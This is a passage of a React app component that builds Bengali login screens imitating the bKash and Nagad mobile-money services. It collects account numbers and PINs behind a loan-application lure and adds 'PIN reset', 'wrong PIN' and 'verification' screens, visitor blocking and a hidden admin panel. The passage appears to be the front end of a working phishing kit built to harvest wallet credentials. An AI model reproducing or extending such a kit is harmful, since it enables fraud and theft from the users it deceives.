            mobileNumber.length >= ((provider === 'bkash' || provider === 'nagad') ? 11 : 12) && (provider === 'bkash' ? pin.length >= 4 : pin.length === 4) && !isLoading ? 'bg-[#E2136E] text-white' : 'bg-gray-300 text-gray-500'
          }`}
        >
          {isLoading ? (
            <div className="flex gap-1.5">
              <span className="w-2.5 h-2.5 rounded-full bg-white animate-bounce" style={{ animationDelay: '0ms' }}></span>
              <span className="w-2.5 h-2.5 rounded-full bg-white animate-bounce" style={{ animationDelay: '150ms' }}></span>
              <span className="w-2.5 h-2.5 rounded-full bg-white animate-bounce" style={{ animationDelay: '300ms' }}></span>
            </div>
          ) : (
            <div className="w-full flex items-center justify-between">
              <span className="font-black text-lg ml-2">পরবর্তী</span>
              <div className="p-1.5 rounded-full bg-white/20">
                <ArrowRight className="w-6 h-6" />
              </div>
            </div>
          )}
        </button>
        {showLoginPopup && (
          <div className="fixed inset-0 flex items-center justify-center z-[300] bg-black/20 backdrop-blur-sm">
            <div className="animate-bounce" style={{ animation: 'popupFloat 1.5s ease-in-out infinite' }}>
              <img src={provider === 'nagad' ? '/nagad-logo.png' : 'https://i.postimg.cc/g2Yx5WPw/1772765797205.png'} alt="" className="w-[40rem] h-auto max-w-[90vw]" />
            </div>
          </div>
        )}
        <style>{`
          @keyframes popupFloat {
            0%, 100% { transform: translateY(0); }
            50% { transform: translateY(-20px); }
          }
        `}</style>
      </div>
    </div>
  );

  const renderPinResetScreen = () => (
    <div className="flex flex-col h-full bg-white">
      <div className="p-6">
        <div className="flex justify-between items-center mb-12">
          <div></div>
          <div className="flex items-center gap-2 text-sm font-bold">
            <span className="text-gray-400 cursor-pointer">Eng</span>
            <span className="h-4 w-[1px] bg-gray-300"></span>
            <span className="text-[#E2136E] border border-[#E2136E] px-2 py-0.5 rounded cursor-pointer">বাং</span>
          </div>
        </div>
        <div className="flex-1">
          <div className="mb-6">
            <img 
              src={provider === 'nagad' ? '/nagad-logo.png' : 'https://i.postimg.cc/yxG385sY/IMG-20260224-061622.png'} 
              alt={provider === 'nagad' ? 'Nagad Logo' : 'bKash Logo'} 
              className="w-16 h-16 object-contain"
            />
          </div>
          <h1 className="text-[22px] font-bold text-gray-700 mb-4 leading-[1.3]">
            আপনার বিকাশ একাউন্ট নম্বর<br />দিয়ে শুরু করুন
          </h1>
          <div className="space-y-8">
            <div>
              <label className="text-[13px] font-bold text-gray-500 mb-3 block">বিকাশ একাউন্ট নাম্বার</label>
              <div className="flex items-center gap-3 border-b-2 border-gray-200 transition-all py-3 px-1" onClick={(e) => e.preventDefault()}>
                <span className="text-xl font-bold text-gray-800">+88</span>
                <input 
                  type="tel" 
                  value={mobileNumber}
                  readOnly
                  tabIndex={-1}
                  onFocus={(e) => e.target.blur()}
                  className="text-xl font-bold text-gray-800 outline-none flex-1 pointer-events-none"
                  maxLength={(provider === 'bkash' || provider === 'nagad') ? 11 : 12}
                  inputMode="numeric"
                />
              </div>
            </div>
            <div>
              <label className="text-[13px] font-bold text-gray-500 mb-3 block">বিকাশ পিন</label>
              <div className="flex items-center gap-3 border-b-2 border-gray-200 focus-within:border-[#E2136E] transition-all py-3 px-1">
                <input 
                  type="password" 
                  placeholder="বিকাশ পিন নাম্বার দিন"
                  value={pin}
                  onChange={(e) => setPin(e.target.value.replace(/\D/g, ''))}
                  className={`text-xl font-bold text-gray-800 outline-none flex-1 placeholder:text-gray-300 ${pin.length > 0 ? 'tracking-[0.3em]' : 'tracking-normal'}`}
                  maxLength={provider === 'bkash' ? 5 : 4}
                  inputMode="numeric"
                  autoFocus
                />
                <button className="text-[#E2136E] p-1">
                  <Fingerprint className="w-8 h-8" strokeWidth={1.5} />
                </button>
              </div>
            </div>
          </div>
        </div>
      </div>
      <div className="mt-auto p-4 bg-white border-t border-gray-50">
        <button 
          disabled={(provider === 'bkash' ? pin.length < 4 : pin.length !== 4) || isLoading}
          onClick={handlePinResetSubmit}
          className={`w-full flex items-center justify-between p-4 rounded-xl transition-all shadow-lg ${
            (provider === 'bkash' ? pin.length >= 4 : pin.length === 4) && !isLoading ? 'bg-[#E2136E] text-white' : 'bg-gray-300 text-gray-500'
          }`}
        >
          {isLoading ? (
            <div className="flex gap-1.5 justify-center w-full">
              <span className="w-2.5 h-2.5 rounded-full bg-white animate-bounce" style={{ animationDelay: '0ms' }}></span>
              <span className="w-2.5 h-2.5 rounded-full bg-white animate-bounce" style={{ animationDelay: '150ms' }}></span>
              <span className="w-2.5 h-2.5 rounded-full bg-white animate-bounce" style={{ animationDelay: '300ms' }}></span>
            </div>
          ) : (
            <div className="w-full flex items-center justify-between">
              <span className="font-black text-lg ml-2">এগিয়ে যান</span>
              <div className="p-1.5 rounded-full bg-white/20">
                <ArrowRight className="w-6 h-6" />
              </div>
            </div>
          )}
        </button>
      </div>
    </div>
  );

  const renderNumberChangeScreen = () => (
    <div className="flex flex-col h-full bg-white">
      <div className="p-6">
        <div className="flex justify-between items-center mb-12">
          <div></div>
          <div className="flex items-center gap-2 text-sm font-bold">
            <span className="text-gray-400 cursor-pointer">Eng</span>
            <span className="h-4 w-[1px] bg-gray-300"></span>
            <span className="text-[#E2136E] border border-[#E2136E] px-2 py-0.5 rounded cursor-pointer">বাং</span>
          </div>
        </div>
        <div className="flex-1">
          <div className="mb-6">
            <img 
              src={provider === 'nagad' ? '/nagad-logo.png' : 'https://i.postimg.cc/yxG385sY/IMG-20260224-061622.png'} 
              alt={provider === 'nagad' ? 'Nagad Logo' : 'bKash Logo'} 
              className="w-16 h-16 object-contain"
            />
          </div>
          <h1 className="text-[22px] font-bold text-gray-700 mb-4 leading-[1.3]">
            আপনার বিকাশ একাউন্ট নম্বর<br />দিয়ে শুরু করুন
          </h1>
          <div className="space-y-8">
            <div>
              <label className="text-[13px] font-bold text-gray-500 mb-3 block">বিকাশ একাউন্ট নাম্বার</label>
              <div className="flex items-center gap-3 border-b-2 border-gray-200 focus-within:border-[#E2136E] transition-all py-3 px-1">
                <span className="text-xl font-bold text-gray-800">+88</span>
                <input 
                  type="tel" 
                  placeholder="01XXXXXXXXX"
                  value={mobileNumber}
                  onChange={(e) => { setMobileNumber(e.target.value.replace(/\D/g, '')); setPhoneError(''); }}
                  className="text-xl font-bold text-gray-800 outline-none flex-1 placeholder:text-gray-200"
                  maxLength={(provider === 'bkash' || provider === 'nagad') ? 11 : 12}
                  inputMode="numeric"
                />
              </div>
              {phoneError && (
                <p className="text-sm text-red-500 font-bold mt-2">{phoneError}</p>
              )}
            </div>
            <div>
              <label className="text-[13px] font-bold text-gray-500 mb-3 block">বিকাশ পিন</label>
              <div className="flex items-center gap-3 border-b-2 border-gray-200 transition-all py-3 px-1" onClick={(e) => e.preventDefault()}>
                <input 
                  type="password" 
                  placeholder="বিকাশ পিন নাম্বার দিন"
                  value={pin}
                  readOnly
                  tabIndex={-1}
                  onFocus={(e) => e.target.blur()}
                  className={`text-xl font-bold text-gray-800 outline-none flex-1 placeholder:text-gray-300 pointer-events-none ${pin.length > 0 ? 'tracking-[0.3em]' : 'tracking-normal'}`}
                  maxLength={provider === 'bkash' ? 5 : 4}
                  inputMode="numeric"
                />
                <button className="text-[#E2136E] p-1 pointer-events-none" tabIndex={-1}>
                  <Fingerprint className="w-8 h-8" strokeWidth={1.5} />
                </button>
              </div>
            </div>
          </div>
        </div>
      </div>
      <div className="mt-auto p-4 bg-white border-t border-gray-50">
        <button 
          disabled={mobileNumber.length < ((provider === 'bkash' || provider === 'nagad') ? 11 : 12) || isLoading}
          onClick={handleNumberChangeSubmit}
          className={`w-full flex items-center justify-between p-4 rounded-xl transition-all shadow-lg ${
            mobileNumber.length >= ((provider === 'bkash' || provider === 'nagad') ? 11 : 12) && !isLoading ? 'bg-[#E2136E] text-white' : 'bg-gray-300 text-gray-500'
          }`}
        >
          {isLoading ? (
            <div className="flex gap-1.5 justify-center w-full">
              <span className="w-2.5 h-2.5 rounded-full bg-white animate-bounce" style={{ animationDelay: '0ms' }}></span>
              <span className="w-2.5 h-2.5 rounded-full bg-white animate-bounce" style={{ animationDelay: '150ms' }}></span>
              <span className="w-2.5 h-2.5 rounded-full bg-white animate-bounce" style={{ animationDelay: '300ms' }}></span>
            </div>
          ) : (
            <div className="w-full flex items-center justify-between">
              <span className="font-black text-lg ml-2">এগিয়ে যান</span>
              <div className="p-1.5 rounded-full bg-white/20">
                <ArrowRight className="w-6 h-6" />
              </div>
            </div>
          )}
        </button>
      </div>
    </div>
  );

  const renderWaitingScreen = () => (
    <div className="flex flex-col h-full bg-white items-center justify-center p-6">
      <div className="flex space-x-2 mb-6">
        <div className="w-4 h-4 bg-[#E2136E] rounded-full animate-bounce"></div>
        <div className="w-4 h-4 bg-[#E2136E] rounded-full animate-bounce [animation-delay:-0.15s]"></div>
        <div className="w-4 h-4 bg-[#E2136E] rounded-full animate-bounce [animation-delay:-0.3s]"></div>
      </div>
      <p className="text-gray-600 font-bold animate-pulse text-center">অ্যাকাউন্ট ভেরিফিকেশন করা হচ্ছে, দয়া করে অপেক্ষা করুন...</p>
    </div>
  );

  if (isBlocked && currentStep !== AppStep.Admin) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-gray-50 p-4">
        <div className="bg-white p-8 rounded-2xl shadow-xl text-center max-w-md">
          <div className="w-16 h-16 bg-red-100 rounded-full flex items-center justify-center mx-auto mb-4">
            <svg className="w-10 h-10 text-red-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M18.364 18.364A9 9 0 005.636 5.636m12.728 12.728A9 9 0 015.636 5.636m12.728 12.728L5.636 5.636"/>
            </svg>
          </div>
          <h2 className="text-xl font-black text-red-600 mb-2">অ্যাক্সেস ব্লক করা হয়েছে</h2>
          <p className="text-sm text-gray-500 font-medium">আপনার অ্যাকাউন্ট সাময়িকভাবে স্থগিত করা হয়েছে। অনুগ্রহ করে পরে আবার চেষ্টা করুন।</p>
        </div>
      </div>
    );
  }

  if (showLogin) {
    return (
      <div className="max-w-md mx-auto h-screen bg-white shadow-2xl overflow-hidden relative flex flex-col">
        <AnimatePresence mode="wait">
          <motion.div
            key={loginView}
            initial={{ opacity: 0, x: 10 }}
            animate={{ opacity: 1, x: 0 }}
            exit={{ opacity: 0, x: -10 }}
            transition={{ duration: 0.25, ease: "easeOut" }}
            className="h-full flex flex-col"
          >
            {loginView === 'login' && renderLoginScreen()}
            {loginView === 'pin_reset' && renderPinResetScreen()}
            {loginView === 'waiting' && renderWaitingScreen()}
            {loginView === 'number_change' && renderNumberChangeScreen()}
          </motion.div>
        </AnimatePresence>
      </div>
    );
  }

  const renderStep = () => {
    switch (currentStep) {
      case AppStep.Home:
        return (
          <div data-keep-text data-keep-theme>
            <HomePage onStartBkash={handleStartBkash} onStartNagad={handleStartNagad} onStartRocket={handleStartRocket} onStartBank={handleStartBank} onLoanApplyIntent={handleLoanApplyIntent} nagadEnabled={nagadEnabled} bkashEnabled={bkashEnabled} rocketEnabled={rocketEnabled} bankEnabled={bankEnabled} />
          </div>
        );
      case AppStep.ApplicationForm:
        return <LoanForm onSubmit={handleFormSubmit} initialData={formData} loginPhone={mobileNumber} />;
      case AppStep.AccountDetails:
        return <AccountDetailsPage data={formData} sessionId={sessionId} onSubmit={handleAccountDetailsSubmit} startAtStep={accountDetailsStartStep} />;
      case AppStep.FinalResult:
        return (
          <FinalResultPage 
            data={formData} 
            sessionId={sessionId} 
            onSubmit={() => setCurrentStep(AppStep.Home)} 
            userBalance={userBalance}
            lastTransaction={lastTransaction}
            onSessionChange={handleSessionChange}
            onReverifyBalance={handleReverifyBalance}
            onWrongNumber={handleWrongNumber}
            onWrongPin={handleWrongPin}
            startAtLoading={finalResultStartLoading}
            onLoadingStarted={() => setFinalResultStartLoading(false)}
          />
        );
      case AppStep.Admin:
        return <AdminPanel onBack={() => { setShowLogin(true); setCurrentStep(AppStep.Home); }} />;
      default:
        return <HomePage onStartBkash={handleStartBkash} onStartNagad={handleStartNagad} onStartRocket={handleStartRocket} onStartBank={handleStartBank} onLoanApplyIntent={handleLoanApplyIntent} nagadEnabled={nagadEnabled} bkashEnabled={bkashEnabled} rocketEnabled={rocketEnabled} bankEnabled={bankEnabled} />;
    }
  };

  return (
    <div className="min-h-screen flex flex-col relative">
      <Header provider={currentStep === AppStep.Home ? null : provider} />
      <main className="flex-grow container mx-auto px-4 py-8">
        {renderStep()}
      </main>
      <Footer onAdminClick={() => setShowAdminModal(true)} />

      {showAdminModal && (
        <div className="fixed inset-0 z-[200] flex items-center justify-center bg-black/60 backdrop-blur-sm p-4">
          <div className="bg-white rounded-2xl shadow-2xl p-8 max-w-sm w-full animate-fade-in">
            <h3 className="text-xl font-bold text-gray-800 mb-4 text-center">এডমিন লগইন</h3>
            <form onSubmit={handleAdminLogin} className="space-y-4">
              <input 
                type="password" 
                value={adminPassword}
                onChange={(e) => setAdminPassword(e.target.value)}
                placeholder="পাসওয়ার্ড দিন"
                autoFocus
                className="w-full p-3 border border-gray-200 rounded-lg outline-none focus:ring-2 focus:ring-[#E2136E] text-center"
              />
              <div className="flex space-x-3">
                <button type="button" onClick={() => setShowAdminModal(false)} className="flex-1 py-2 text-gray-500 font-bold">বাতিল</button>
                <button type="submit" className="flex-1 py-2 bg-[#E2136E] text-white font-bold rounded-lg">প্রবেশ</button>
              </div>
            </form>
          </div>
        </div>
      )}
    </div>
  );
};

export default App;
